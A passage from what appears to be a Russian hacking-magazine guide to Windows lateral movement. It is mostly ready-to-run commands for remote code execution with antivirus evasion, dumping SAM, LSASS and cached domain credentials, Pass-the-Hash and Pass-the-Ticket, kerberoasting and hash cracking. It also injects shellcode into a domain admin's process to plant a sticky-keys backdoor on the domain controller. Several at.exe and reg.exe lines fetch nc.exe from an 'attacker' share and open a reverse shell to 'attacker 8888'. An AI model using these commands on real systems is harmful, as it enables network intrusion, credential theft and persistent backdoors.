почти наверняка поднимет антивирусную тре вогу. Как было сказано, все дело
в службе, которая копируется на удаленный хост. Это можно исправить, ука‐
зав в реали зации метода createService() в /usr/local/lib/python3.7/
dist‐packages/impacket/examples/serviceinstall.py    произвольную
команду, которая будет выполнена вместо запускаемой службы уда ленного
администрирования.




 С помощью про извольной команды можно скрыть запуск службы удален‐
  ного адми нис три рова ния

Чтобы psexec.py не скопиро вал палев ный компонент, указываем принуди‐
тельно, какой файл использовать в качестве службы. И, поскольку мы уже
вручную прописали команду, этим файлом может быть что угод но:


psexec.py ‐file somefile.txt admin@target

Таким образом, мы напрямую выпол нили команду mkdir c:\pwn, что, конеч‐
но же, не вызовет реакции со стороны антивирусов. Однако подобная
модификация psexec лишает нас того удобс тва использования, которое было
изначально.


winexe
 • Происхождение: пакет winexe
 • AV-риск: есть
 • Ис поль зуемые порты: 445/TCP

Более старый натив ный ана лог psexec под Linux. Как и psexec, открывает
удаленную инте рак тивную командную стро ку:


winexe ‐U admin //target cmd

В целом он пол ностью идентичен дру гим подобным инструментам, однако
реже обнаруживается антивиру сами. Но все же нельзя сказать, что winexe
на сто про цен тов безопасен. Тем не менее его можно использовать
для подстраховки на слу чай, если psexec.py вдруг не сработает.


smbexec.py
 • Происхождение:  Python‐пакет  impacket  /  встро енный  ком понент
   Windows
 • AV-риск: есть
 • Ис поль зуемые порты: 445/TCP

Упрощенный вари ант psexec, также создающий служ бу, только используется
при этом исключительно MSRPC, а доступ к управлению службами устро ен
через SMB‐пайп svcctl:


smbexec.py ‐mode SHARE admin@target

В резуль тате будет открыт доступ к инте рактивной командной строке.


services.py
 • Происхождение: Python‐пакет impacket
 • AV-риск: отсутствует
 • Ис поль зуемые порты: 445/TCP

Еще более упро щенный вариант psexec. Тут предполагается, что мы сами
ручками делаем то, что делает за нас psexec. С помощью services.py мы
можем посмотреть список служб:


services.py admin@target list

Создать новую службу, указав про извольную команду:


services.py admin@target create ‐name 1 ‐display 1 ‐path 'cmd arg1
arg2'

Запустить только что соз данную службу:


services.py admin@target start ‐name 1

Замести следы и уда лить ее:


services.py admin@target delete ‐name 1

Все это дает нам еще один спо соб слепого неинтерактивного исполнения
команд, то есть без результата. Зато это на сто процентов безопасный спо‐
соб, и он не раз выручал меня, когда антивирусы на удаленном хосте убивали
весь левый софт.


atexec.py/at.exe
 • Происхождение:  Python‐пакет  impacket  /  встро енный  ком понент
   Windows
 • AV-риск: отсутствует
 • Ис поль зуемые порты: 445/TCP

Служба планировщика заданий Windows, доступная через smb‐пайп atsvc.
Позволяет удаленно поместить в планировщик задачу, которая выполнится
в ука зан ный момент. В обоих случаях это неинтерактивное средство удален‐
ного исполне ния  кода. При использовании at.exe происходит слепое
исполнение команд:


at.exe \\target 13:37 "cmd /c copy \\attacker\a\nc.exe && nc ‐e \
windows\system32\cmd.exe attacker 8888"

А вот для atexec.py команда выполнится с результатом:


atexec.py admin@target ipconfig

Вся разница в том, что результат выполнения коман ды будет направлен
в файл и прочитан через сетевой ресурс ADMIN$. Для своей работы инстру‐
мент требует, что бы часы у attacker и target были настроены на одно время
с точностью до минуты.


reg.exe
 • Происхождение: компонент Windows
 • AV-риск: отсутствует
 • Ис поль зуемые порты: 445/TCP

Удаленный доступ к реестру с правами на запись на самом деле нам дает
RCE. Для своей работы инструмент требует SMB‐пайп winreg. По умолчанию
служба уда лен ного реес тра запущена только на серверных ОС Windows
2003–2019. А вот известный трюк с автозагрузкой (отложенное RCE):


reg.exe add \\target\HKLM\software\microsoft\windows\currentversion\
run /v testprog /t REG_SZ /d "cmd /c copy \\attacker\a\nc.exe && nc
‐e \windows\system32\cmd.exe attacker 8888"

Здесь исполь зуется обработчик запуска программы. Если программа запус‐
кается на ПК часто, то получим почти мгновенное RCE:


reg.exe add "\\target\HKLM\SOFTWARE\Microsoft\Windows NT\
CurrentVersion\Image File Execution Options\chrome.exe" /v Debugger /
t reg_sz /d "cmd /c copy \\attacker\a\nc.exe && nc ‐e \windows\
system32\cmd.exe attacker 8888"

Мой любимый трюк с бэкдором в RDP:


reg.exe add "\\target\HKLM\SOFTWARE\Microsoft\Windows NT\
CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t
 reg_sz /d "\windows\system32\cmd.exe"


DCERPC
Использует порты 135/TCP и 4915x/TCP, где 4915x — динамически назнача‐
емые порты. Иног да могут использоваться порты из дру гого диапазона.
   Очень час то сетевые администраторы и безопасники, которые в курсе
наиболее распростра ненных век торов атак, в качестве mitigation прос то бло‐
кируют порт 445/TCP. Тем самым они делают неп ригодным использование
psexec и многих других способов, описан ных выше. Однако, как было ска‐
зано ранее, Windows имеет множество способов уда ленного исполнения
кода, и DCERPC пре доставляет нам такую альтернативную возможность,
в некоторых случаях открывая дос туп к тем же RPC‐интерфейсам. По сути, мы
будем исполь зовать не сам DCERPC, а то, что работает по его технологии,
например WMI.


wmiexec.py
 • Происхождение: Python‐пакет impacket
 • AV-риск: есть
 • Ис поль зуемые порты: 135, (445), 4915x/TCP

Скрипт wmiexec.py дает возможность выполнить код в интерактивном
режиме:


wmiexec.py admin@target

Однако было замечено, что хоть wmiexec.py и не запускает на уда ленной
стороне никаких сторонних исполняемых файлов, антивиру сы его иногда
ловят. Кроме того, wmiexec.py полезет за результатом на шару ADMIN$, чем
задействует порт 445/TCP. Более безопасным вариантом будет слепое RCE:


wmiexec.py ‐nooutput admin@target "mkdir c:\pwn"


dcomexec.py
 • Происхождение: Python‐пакет impacket
 • AV-риск: отсутствует
 • Ис поль зуемые порты: 135, (445), 4915x/TCP

Инструмент, похожий на wmiexec.py. По умолчанию он интерактивный, а за
результатом тоже идет на сетевой диск ADMIN$, используя порт 445/TCP:


dcomexec.py admin@target

Чтобы обой ти использование порта 445/TCP, можно ограничиться слепым
исполнением кода:


dcomexec.py ‐nooutput admin@10.0.0.64 "mkdir c:\123"


wmis
 • Происхождение: пакеты wmi‐client, wmis
 • AV-риск: есть
 • Ис поль зуемые порты: 135, 4915x/TCP

Существует небольшая путаница c утилитой wmis: она присутствует сразу
в двух пакетах с одинаковым име нем. Для ее вызова использует ся следующая
команда:


wmis ‐U admin //target "mkdir c:\pwn"

Принципи альной разницы между ними я не заметил, за исключением того, что
одна может не сработать.


wmic.exe
 • Происхождение: компонент Windows
 • AV-риск: отсутствует
 • Ис поль зуемые порты: 135, 4915x/TCP

Достаточно прикольный способ слепого исполнения кода «из коробки»
для всех ОС Windows:


wmic.exe /user:username /password:s3cr3t /node:target process call
create '"c:\1.bat"'

Единственная коман да Windows, которая неинтерактивно принимает логин
и пароль через опции, что позволяет вызывать ее откуда угодно. Данная
команда потом нам сильно поможет получить админскую учетную запись.


sc.exe
 • Происхождение: компонент Windows
 • AV-риск: отсутствует
 • Ис поль зуемые порты: 135, 4915x/TCP

Назначение инструмен та — уда ленное управление службами и драй верами.
Аналогично утилите services.py мы можем запустить произволь ную команду
при создании службы:


sc.exe \\target create testservice binPath= \path\to\prog start= auto
sc.exe \\target start testservice

При этом в отли чие от services.py мы исполь зуем для этого совсем другие
порты, так как здесь задейство ван DCERPC.


WinRM
Под этим наз ванием скрывается новое средство удаленного администри‐
рования Windows Remote Management, появившееся в Windows 7/2008.
Использует для своей работы в качестве транспор та протокол HTTP. Но по
умолчанию WinRM работает толь ко на серверных Windows Server 2012–2019,
на клиентских же Windows 7–10 требуется включить его вручную. Тем
не менее, когда глав ная цель — это работа ющий на Windows Server контрол‐
лер домена, данный способ довольно полезен.


Evil-WinRM
 • Происхождение: Ruby‐пакет evil‐winrm
 • AV-риск: отсутствует
 • Ис поль зуемые порты: 5985/TCP (5986/TCP)

Предоставляет интерактивный шелл:


evil‐winrm ‐u admin ‐i target


WinRS.exe/PowerShell
 • Происхождение: компонент Windows
 • AV-риск: отсутствует
 • Ис поль зуемые порты: 5985/TCP (5986/TCP)

С помощью это го встро енного компонента ОС Windows можно интерактивно
получить удален ный доступ:


c:> winrs.exe ‐u admin ‐r:target cmd

Еще с исполь зованием PowerShell можно выполнять команды и командле ты:


PS:> Enter‐PSSession ‐ComputerName target ‐Credential admin
PS:>Invoke‐Command ‐ScriptBlock {ipconfig;get‐process} ‐ComputerName
(Get‐Content targets.txt)


RDP
 • Происхождение: пакеты  freerdp2‐x11,  rdesktop, компонент Windows
  mstsc.exe и дру гие
 • AV-риск: отсутствует
 • Ис поль зуемые порты: 3389/TCP

Не самый удобный способ исполне ния кода, не самый пер спективный в пла‐
не Pass‐the‐Hash/Pass‐the‐Ticket, но работающий почти из короб ки почти
на всех Windows:


xfreerdp /u:admin /v:target
rdesktop ‐u admin target
mstsc.exe /v:target




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
            LATERAL     ГИД ПО
           ИЗУЧАЕМ УДАЛЕННОЕ ИСПОЛНЕНИЕ КОДА
                    В WINDOWS СО ВСЕХ СТОРОН





GP
Групповые политики могут помочь в исполнении кода на хорошо защищен ных
ПК, полностью закрытых файрволом либо расположенных в изо лированных
сетях. Их используют в ситуации, когда контроллер домена уже взят, но надо
двигаться дальше.
   Тут на помощь приходят обыч ные групповые политики. Их преимущество
перед все ми опи санными ранее методами состоит в том, что они работа ют
как бы по схеме reverse‐connect. Если до этого мы сами иницииро вали под‐
ключение и нам требовались открытые пор ты на target (135, 445, 3389, 5985,
4915x), то все, что понадобится тут, — это дос туп к самому DC. Как правило,
DC не прячет ся за файрволами, поэто му с его администрирова нием не дол‐
жно возникнуть проблем.
  С помощью оснастки gpmc.msc создаем групповую политику для нужного
контейнера. В каком контейнере находит ся  target, поможет определить
оснастка dsa.msc. После создания политики на событие logon вешается
скрипт на VBS с произвольным содержимым. Для срабаты вания RCE нужно
ждать, когда пользователь целевой машины пов торно войдет в сис тему.
   Часто такие критичес кие компонен ты внутренней инфраструктуры, как кон‐
троллер домена, охраняются SIEM. Изменение в его кон фигурации, в том
числе соз дание нового объекта групповой политики, может отслеживаться
и очень негатив но восприниматься безопасниками. Поэто му вместо соз‐
дания новой групповой полити ки луч ше найти существующую и внедрить нуж‐
ный код в скрипт, расположенный в шаре SYSVOL.
  В таблице ниже приведены основные осо бен ности разных методов аутен‐
тифицирован ного исполне ния кода в дефолтном исполнении (без модифи‐
каций).





Каждый сам выбирает для себя любимый инструмент. Но нужно иметь в виду,
что иногда инс тру мент может не сработать. И тогда надо иметь подстра ховку,
уметь выполнить код еще несколь кими способами. Эта таблица поможет тебе
сориентироваться.
  Видно, что наиболее «бесшумным» способом исполнения кода остаются
компоненты Windows (winrs.exe, sc.exe, reg.exe, at.exe, wmic.exe, psex‐
ec.exe), но не все из них могут похвастать ся удобством. Утилиты sc.exe,
reg.exe, at.exe не под держи вают передачу имени поль зователя через
опции, поэто му для их использования надо запустить cmd от нужного поль‐
зователя, а в случае с локальной учеткой — предварительно соз дать ее.
   Только что мы рассмот рели разные способы аутентифици рованного
исполнения кода, то есть legal RCE с учет ной записью. Теперь поговорим
о том, где эти самые учетные записи можно най ти, какие они быва ют и в
каком виде представлены.


Локальные учетные записи
При аутентификации юзеров Windows не различает регистр имени поль‐
зователя: ADMIN для нее то же, что и admin. Это справедливо и для локаль‐
ных, и для доменных учет ных записей.
   Главная идея использования локальных учетных записей состоит в том,
что один и тот же пароль может встретиться на целом ряде ПК и серверов.
Порою быва ет, что такие локальные учетки при водят пря мо на ПК админов
или сра зу на контроллер домена.
  Локальные пользователи вместе с NTLM‐хешами хранятся в реестре
по пути HKLM\sam. Сам по себе SAM (Security Account Manager) — это отдель‐
ный куст реес тра, который лежит в \windows\system32\config\ наряду
с другими кустами. При меча тель но, что даже администратор (за исклю чени‐
ем system) не может получить доступ к HKLM\sam с помощью regedit.exe
или напрямую скопировав файл из системной директории. Однако команда
reg.exe позволяет сделать это. Очень важно, что мы будем извле кать сис‐
темные файлы с помощью встроенных компонентов ОС, а ана лизировать их
уже на нашей системе. Тем самым мы абсолют но точ но не вызовем анти‐
вирусной тре воги.
  Для извле чения локальных учетных записей понадобится два куста реес‐
тра:


reg.exe save hklm\sam sam
reg.exe save hklm\system system

На своей стороне для извлечения хешей локальных учеток используем сле‐
дующую коман ду:


creddump7\pwdump.py system sam

Также можно воспользоваться уже известным набором impacket:


secretsdump.py ‐system system ‐sam sam LOCAL

Полностью автоматизирован ный подход с помощью дос тупа через remote
registry выглядит так:


secretsdump.py admin@target

В резуль тате получаем хеши в формате Username:RID:LM‐hash:NTLM‐
hash:::. В новых сис темах (начиная с Windows 7/2008R2) LM‐хеш может
быть пустым, то есть иметь значение aad3b435b51404eeaad3b435b51404ee,
так как LM‐хеши больше не используются по соображениям безопас ности.
Пустой     пароль     NTLM‐хеша,     в     свою     очередь,   —
это 31d6cfe0d16ae931b73c59d7e0c089c0. Во время бокового перемещения,
когда хешей очень много, такие хеши надо обна руживать сразу и отбра‐
сывать, так как огра ничение пустого пароля не позволит выпол нить удален‐
ный вход.


Pass-the-Hash
Windows име ет хорошо известную и достаточно забавную особенность, поз‐
воляющую использовать для аутентифика ции NTLM‐хеш без необходимости
выполнять его брутфорс и восстанав ливать пароль. Все извлеченные NTLM‐
хеши (отличные  от 31d6cfe0d16ae931b73c59d7e0c089c0) могут исполь‐
зоваться для аутентификации на следующих типах сер висов:
 • MSRPC (SMB);
 • DCERPC (WMI);
 • WINRM;
 • MS SQL;
 • RDP (только Windows 2012 R2 и Windows 8.1);
 • LDAP;
 • IMAP;
 • HTTP.

Но выполнять код мы можем, как правило, только на первых пяти сервисах
из спис ка, для последних трех более применимы атаки NTLM‐relay. Все рас‐
смотренные инс тру менты из набора impacket под держи вают передачу хеша
как LM:NTLM, так и с указанием только NTLM‐хеша:


psexec.py ‐hashes LM:NTLM admin@target
wmiexec.py ‐hashes :NTLM admin@target

В дистрибутиве Kali есть девять специально соб ранных популярных инстру‐
ментов для реали зации техники Pass‐the‐Hash. Все они начинаются на pth‐:


export SMBHASH=aad3b435b51404eeaad3b435b51404ee:
31d6cfe0d16ae931b73c59d7e0c089c0
pth‐winexe ‐U admin% //target cmd
pth‐wmic ‐U admin% //target "select Name from Win32_UserAccount"
pth‐wmis ‐U admin% //target "cmd.exe /c whoami > c:\out.txt"
pth‐smbclient ‐U admin% //target/c$
pth‐rpcclient ‐U admin% //target
pth‐sqsh ‐U admin ‐S target
pth‐curl http://target/exec?cmd=ipconfig
pth‐net rpc group ADDMEM 'Administrators' username ‐S target ‐U
domain/user

Начиная с версии xfreerdp v2.0.0 и только для Windows 2012 R2 и Windows
8.1 мож но пройти аутентификацию с использованием NTLM‐хеша по RDP:


./client/X11/xfreerdp /v:target /u:admin /pth:
31d6cfe0d16ae931b73c59d7e0c089c0

Современный WinRM, к счастью, тоже не под качал:


evil‐winrm ‐i target ‐u admin ‐H 31d6cfe0d16ae931b73c59d7e0c089c0

Все примеры выше — это Pass‐the‐Hash для Linux. Мы упоминали инструмен‐
ты Windows для удаленного исполнения кода: psexec.exe, at.exe, reg.exe,
wmic.exe, sc.exe, winrs.exe. Чтобы использовать их в атаках Pass‐the‐Hash,
нужно соз дать временную сессию с помощью mimikatz:


mimikatz# sekurlsa::pth /user:administrator /domain:. /ntlm:
31d6cfe0d16ae931b73c59d7e0c089c0

Затем в появившемся окне cmd нужный NTLM‐хеш будет автоматически под‐
ставлен для любой вызываемой программы:


dir \\target\c$

Кстати, посчитать NTLM‐хеш для парольной фразы можно и самостоятель но:


#!/usr/bin/python2
import hashlib,binascii,sys
if len(sys.argv) == 1:
        print binascii.hexlify(hashlib.new('md4', raw_input().decode(
'utf‐8').encode('utf‐16le')).digest())
else:
        print binascii.hexlify(hashlib.new('md4', sys.argv[1].encode(
'utf‐16le')).digest())


Bruteforce
Если требуется аутентифика ция на сер висе, который не поддерживает Pass‐
the‐Hash, например RDP, может быть при менена атака подбором пароля
на достаточно высоких скоростях. LM‐хеши имеют конечный набор входных
значений, шифруются половин ками по 7 байт и нечувствительны к регистру.
Это значит, что абсолют но любой LM‐хеш может быть взломан. С NTLM‐
хешем ситу ация немного сложнее.


LM
Для LM‐хешей надежнее всего использовать rainbows (радужные таблицы)
ophcrack:


ophcrack ‐g ‐d /opt/rainbows/LM ‐t xp_special,0,1,2,3 ‐f hashes‐lm.
txt

Либо классический брут форс по словарю:


john ‐‐format=lm ‐‐wordlist=/usr/share/wordlists/rockyou.txt
hashes‐lm.txt

Раньше, кста ти, существовал замечательный китайский ресурс, который
любой LM‐хеш мог превратить в plaintext.


NTLM
Hashcat и John по‐раз ному ожидают подачу NTLM‐хешей. Так, для Hashcat
команда выг лядит сле дующим образом:


31d6cfe0d16ae931b73c59d7e0c089c0
hashcat ‐a 0 ‐m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt
hashcat ‐a 3 ‐m 1000 hashes_ntlm.txt ‐1='?u?d?l' '?1?1?1?1?1?1'

Для John:


admin:500:aad3b435b51404eeaad3b435b51404ee:
31d6cfe0d16ae931b73c59d7e0c089c0:::
john ‐‐format=nt ‐‐wordlist=/usr/share/wordlists/rockyou.txt
hashes_ntlm.txt

И LM‐, и NTLM‐хеши могут быть также найдены и для доменных пользовате‐
лей при анализе памяти lsass.exe или в базе ntds.dit. Они никогда
не передаются по сети как есть, вместо этого они транслируются в виде Net‐
NTLM/NetNTLMv2‐хешей, которые непригодны для Pass‐the‐Hash. Данные
типы хешей одноразовые и могут быть использованы только в момент
передачи (техника NTLM‐relay) либо для брутфорс‐атак на достаточно боль‐
ших скоростях.


БИЛЕТЫ KERBEROS
Для исполь зования Kerberos‐билетов при аутентифика ции требует ся доступ
к порту 88/TCP контрол лера домена.


Kerberoasting
Техника kerberoasting чрез вычайно полезна, так как часто с ее помощью мож‐
но скомпрометировать учетки администраторов домена и прочие интересные
сервисные учет ные записи. Для своего применения она требует любую
доменную учет ную запись.
   Суть ее заключа ется в том, что для некоторых сервисных учетных записей
с контроллера домена можно выг рузить TGS‐билет Kerberos для доступа к той
или иной службе. Эти билеты зашифрованы паролем (NTLM‐хешем) соот‐
ветствующего пользователя. А это значит, что такие билеты могут быть под‐
вержены офлайн‐атаке подбором пароля по сло варю. Поэтому крайне важно
любой ценой достать эти билеты.
   Всех пользователей, у которых можно выгрузить TGS‐билет, можно найти
поисковым LDAP‐филь тром:


(&(samAccountType=805306368)(servicePrincipalName=*))

Классический kerberoasting можно выпол нить многими способа ми. Нап‐
ример, с помощью impacket, действуя из Linux:


GetUserSPNs.py ‐request ‐dc‐ip 10.0.0.1 domain.com/username

Если атакующий использует Windows, то же самое можно сделать, например,
с помощью rubeus.exe:


Rubeus.exe kerberoast /outfile:hashes.txt

Rubeus редко палится антивирусами. Но если мы рассуждаем о постэксплу‐
атации, то нуж но быть готовым к самым разным сложностям. Точкой про ник‐
новения во внутреннюю сеть может стать машина под управлением Windows,
из‐за чего придется использовать ее небогатый арсенал.
  Существует способ выполнить kerberoasting базовыми средс твами ОС
с помощью PowerShell:


PS> setspn ‐T domain.com ‐Q */*
PS> Add‐Type ‐AssemblyName System.IdentityModel
PS> New‐Object System.IdentityModel.Tokens.
KerberosRequestorSecurityToken ‐ArgumentList "HTTP/web01.domain.com"
PS> klist

Однако в этом слу чае билеты получит Windows, а не мы. Они будут сохранены
в памяти. К сожалению, базовыми средствами ОС невоз можно сдампить
полученные Kerberos‐билеты в форму, при годную для брутфорса.


Извлечение Kerberos-билетов через дамп виртуальной памяти
Если антивирус не дает запустить упо мяну тые инстру менты, мы можем сде‐
лать дамп памяти процесса lsass.exe. Есть как минимум три спо соба:
 • taskmgr.exe → ПКМ по lsass.exe → дамп памяти;
 • rundll32.exe   C:\windows\System32\comsvcs.dll,   MiniDump
  624 C:\temp\lsass.dmp full ;
 • procdump.exe ma lsass.exe /accepteula .

Если дамп удалось создать, то билеты можно безопасно извлечь уже на сво‐
ей стороне:


mimikatz.exe
sekurlsa::Minidump lsass.dmp
sekurlsa::tickets /export

Однако иног да антивирус не давал мне подоб раться к lsass.exe, что,
в прин ципе, и понятно.


Извлечение Kerberos-билетов через дамп физической памяти
Если к процессу никак не подобраться, на помощь придет дамп всей
физической памяти. Сделать это можно инструментом из открытого фрей‐
мворка по форен зике rekall:


winpmem.exe ‐‐mode MmMapIoSpace ‐‐format raw ‐‐output ram.dmp.zip

Полученный дамп будет вну шительного раз мера — несколько гигабайтов.
Для извле чения из него билетов потребуется отладчик WinDbg и плагин
для него mimilib.dll:


windbg:> .symfix
windbg:> .reload
windbg:> !process 0 0 lsass.exe
windbg:> .process /p /r EPROCESS
windbg:> .load c:\path\to\mimikatz\mimilib.dll
windbg:> !mimikatz


Извлечение Kerberos-билетов из сетевого трафика
Достаточно элегантным решением может быть перехват билетов из сетево го
трафика в момент их выгрузки:


TCPdump.exe ‐i 1 ‐nn ‐w out.pcap
./[extracttgsrepfrompcap.py](https://github.com/nidem/kerberoast/
blob/master/extracttgsrepfrompcap.py) ‐f out.pcap ‐w out.txt


Bruteforce TGS
Применять брутфорс‐атаку име ет смысл только против TGS Kerberos‐билетов
(билетов для доступа к службам), так как они зашифрованы паролем поль‐
зователя:


john ‐‐format=krb5tgs ‐‐wordlist=/usr/share/wordlists/rockyou.txt
hashes‐tgs.txt
hashcat3 ‐a 0 ‐m 13100 hashes‐tgs.txt /usr/share/wordlists/rockyou.
txt

Брутфорс  будет  происхо дить  на  достаточно  высокой  скорости —
более 1 мил лиона в секунду ($krb5tgs$23 RC4).


Pass-the-Ticket
Если у нас имеется Kerberos‐билет TGT (билет пользователя), то мы можем
применить его для аутентифика ции. При этом Linux и Windows используют
разные фор маты — ccache и kirbi соответс твенно. В свою очередь, билеты
могут быть изначально представлены в любом из этих форматов, в зависи‐
мости от того, из какой ОС мы их взяли. Но и восполь зоваться ими нужно
уметь для любой ОС.
  Под Windows для импорта билета в формате kirbi используется следующий
подход:


mimikatz# kerberos::ptt c:\path\to\tgt.kirbi

Для импорта в формате ccache:


mimikatz# kerberos::ptс c:\path\to\tgt.ccache

После импорта используем любую нуж ную нам программу без указания
каких‐либо ключей:


dir \\dc.company.org\c$

Под Linux делаем Pass‐the‐Ticket в формате ccache:


cp tgt.ccache /tmp/krb5cc_0
klist

Как упомина лось, Linux фор мат kirbi не понима ет. Поэтому билет нужно скон‐
вертировать в ccache c помощью kekeo.exe:


kekeo.exe "misc::convert ccache ticket.kirbi" "exit"

После импорта билеты в Linux используем следующим образом:


smbclient ‐k //dc.company.org/c$
winexe ‐k yes ‐N //dc.company.org cmd

Также инс трумен ты из набора impacket могут использовать билеты без пред‐
варительного импорта:


KRB5CCNAME=`pwd`/tgt.ccache psexec.py ‐k ‐dc‐ip 10.0.0.1 target.
domain.com
KRB5CCNAME=`pwd`/tgt.ccache secretsdump.py ‐k ‐no‐pass target.domain.
com
KRB5CCNAME=`pwd`/tgt.ccache atexec.py ‐k ‐no‐pass ‐dc‐ip 10.0.0.1
target.domain.com
KRB5CCNAME=`pwd`/tgt.ccache services.py ‐k ‐no‐pass ‐dc‐ip 10.0.0.1
target.domain.com list

Чтобы использовать Kerberos‐билет при аутентификации, нужно обращаться
к target по имени, а не по IP‐адресу.


ДОМЕННЫЕ УЧЕТНЫЕ ЗАПИСИ
Доменные учетные записи в инфраструктуре компаний, использующих Active
Directory, считаются наиболее при ори тетной мишенью. Именно доменные
учетные записи в итоге приводят нас на контроллер домена.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
            LATERAL     ГИД ПО
           ИЗУЧАЕМ УДАЛЕННОЕ ИСПОЛНЕНИЕ КОДА
                    В WINDOWS СО ВСЕХ СТОРОН





Кеш хешированных доменных учетных записей
Кеш хешированных учетных записей, или Domain Credential Cache, — это куст
реестра, куда записы ваются все успешные логоны в сис тему под доменными
учетными записями на случай, если контроллер домена в будущем окажется
недоступен. Содержимое этого кеша легко извлечь уже зна комым нам спо‐
собом:


reg.exe save hklm\security security
reg.exe save hklm\system system

В нем хранят ся хеши доменных учетных записей. Что бы получить их, выпол‐
няем сле дующую команду:


creddump7\cachedump.py system security true

Для старых вер сий Windows creddump7 не всегда извлекает хеши, в таком
случае может пригодить ся старый же вариант creddump:


creddump\cachedump.py system security

Аналогично можно вос пользоваться инструментом из impacket:


secretsdump.py ‐system system ‐security security LOCAL

Из того же кеша есть шанс получить сохраненные пароли для служб открытым
текстом:


creddump7\lsadump.py system security

При боковом переме щении шанс встретить в кеше учетную запись админис‐
тратора домена очень велик. Правда, тут есть одно но: поскольку это кеш, то
нет гаран тии, что пароль после кеширования не менялся.
  Существует две версии этого хеша — dcc1 (mscash1) и dcc2 (mscash2).
Данные хеш‐функции имеют абсолютно одинаковую длину, и незнание вер‐
сии ОС может привести к очень долгому безус пешному подбору пароля. Так,
если у нас Windows XP/2003, то используется dcc1:


john ‐‐format=mscash hashes_dcc.txt ‐‐wordlist=/usr/share/wordlists/
rockyou.txt
hashcat ‐a 0 ‐m 1100 hashes_dcc.txt /usr/share/wordlists/rockyou.txt

Если Windows Vista/2008–10/2019, то это dcc2:


john ‐‐format=mscash2 hashes_dcc2.txt ‐‐wordlist=/usr/share/
wordlists/rockyou.txt
hashcat ‐a 0 ‐m 2100 hashes_dcc2.txt /usr/share/wordlists/rockyou.txt

Стоит  отметить,  что  ста рые  Windows  XP/2003  более  пер спективны
для  боково го  перемещения,  так  как  используемая ими  хеш‐функция
dcc1 в 3000 раз сла бее и, следовательно, более под вержена атакам под‐
бором пароля. Поэтому, если доменный администратор когда‐то выполнял
вход на устаревшую ОС Windows, он, сам того не осознавая, замет но осла бил
защиту всей инфраструктуры. Это еще один повод отказаться от старых вер‐
сий Windows.


Учетные данные запущенных сессий
Доменные учетные записи также находят ся в памяти процесса lsass.exe.
Это касается только активных в данный момент сессий. Список поль зовате‐
лей и их про цессов удобно проверять встроенной командой qprocess *.
  Инструменты mimikatz.exe или wce.exe умеют извлекать для активных
сессий хеши и пароли откры тым текстом:


mimikatz.exe privilege::debug sekurlsa::logonPasswords

Однако анти вирусы почему‐то их очень не любят. Тут снова на помощь может
прийти техника дампа памяти.


Из вле чение через дамп вир туаль ной памяти
Делаем дамп одним из перечис ленных выше способов. Пос ле этого восполь‐
зуемся помощью mimikatz:


sekurlsa::Minidump lsassdump.dmp
sekurlsa::logonPasswords


Из вле чение через дамп физичес кой памяти
Как было ска зано  чуть рань ше, антивирус может защитить lsass.exe
от посяга тельств и не поз волить сдам пить процесс ни одним из перечис‐
ленных способов. Тут вновь вооружаемся утилитой winpmem.exe и дампим
всю физическую память. Антивирусу крайне сложно обнаружить процесс дам‐
па физической памяти, так как он выполняется не через WinAPI‐вызовы,
а через прямое чтение памяти из режима ядра.
  Проанализировать дамп памяти мы сможем с помощью отладчика WinDbg
и специаль ного модуля для него от автора mimikatz:


windbg:> .symfix
windbg:> .reload
windbg:> !process 0 0 lsass.exe
windbg:> .process /p /r EPROCESS
windbg:> .load c:\path\to\mimikatz\mimilib.dll
windbg:> !mimikatz

Также у всем известного фреймворка для форен зики Volatility для этой цели
существует специальный модуль:


volatility ‐‐plugins=/path/to/volatility_plugins/FrancescoPicasso ‐f
pmem.img mimikatz


Аппарат ная изоляция про цесса lsalso.exe
В современ ных версиях Windows нас может ждать неприятный сюрприз
в виде lsalso.exe — процесса, защищенного технологией вир туализации.
Существуют, конеч но, техники, связанные с регистрацией провай дера LSASS:


mimikatz.exe misc:memssp

Но тут придется ждать, пока админ выполнит повторный логон. Введенные
учетные данные будут записа ны в c:\windows\system32\mimilsa.log.
  Но так ли нам нужен пароль этого администра тора домена? Подумаем
хорошенько: мы зашли на сервер под одной учетной записью и хотим
получить пароль от другой. В пределах текущего ПК и наша, и админская
учетки находятся на равных уровнях — мы оба локальные администраторы
этого ПК. Это зна чит, что мы можем вза имодействовать как с домашним
каталогом нужной нам учет ки, так и с памятью его процессов.
   Говоря более кон крет но, мы имеем полное право писать код в память
процессов, работающих от име ни доменного адми нистратора, и запускать
в нем произвольные потоки. То есть мы можем просто сгенерировать
шелл‐код с произвольной коман дой и выпол нить ее от имени администра‐
тора домена, заинжектив ее в любой процесс нуж ного пользователя. И для
этого нам не потребу ется даже пароль этого админа:


msfvenom ‐p windows/exec CMD="wmic /node:10.0.0.10 process call
create 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
Image File Execution Options\sethc.exe" /v Debugger /t reg_sz /d "\
windows\system32\cmd.exe"'" ‐f raw ‐e x86/alpha_mixed ‐o shellcode.
txt exitfunc=thread

Мы сгенерили шелл‐код, который с помощью WMI выполнит на контроллере
домена команду,  акти вирующую  sticky  keys. Желательно  сделать  этот
шелл‐код как можно более безобидным — в данном случае он закодирован
в ASCII‐команды, так что будет выг лядеть как простой текстовый файл. Обыч‐
но антивиру сы такое не тро гают.
   Теперь все, что нам нужно, — это выбрать процесс адми нистратора
домена с помощью команды qprocess *. Часто админ ские процессы висят
в параллельной сессии RDP, иногда — забытой. Поэтому в качестве цели
можно взять, например, explorer.exe. Далее мы выделяем в нем немного
памяти, записываем туда наш шелл‐код и запускаем поток c помощью shell‐
code_inject.exe:


shellcode_inject.exe PID shellcode.txt

Только что мы внед рили в контекст администратора домена код, который
на контроллере домена уда ленно запустил команду, активирующую бэкдор.
Теперь под ключимся к этому домену:


rdesktop dc.company.org

Мы уви дим хорошо знакомую картину.





  Результат внедрения шелл‐кода в админский процесс — активация бэк‐
  дора на контрол лере домена

Доступ к контроллеру домена получен. Это значит, что мы можем выполнить
репликацию доменных учетных записей, включая системную учетную запись
krbtgt. С ее помощью можно «нарисовать» TGT Kerberos‐билет того самого
админа и авторизоваться от его имени уже вто рой раз, не зная никакого
пароля. Эта техника называется golden ticket.
  Подведем небольшой итог по самым распростра ненным типам хешей
Windows и областям их использования.





LATERAL MOVEMENT
Так или иначе, для бокового перемещения на вхо де мы можем иметь учетные
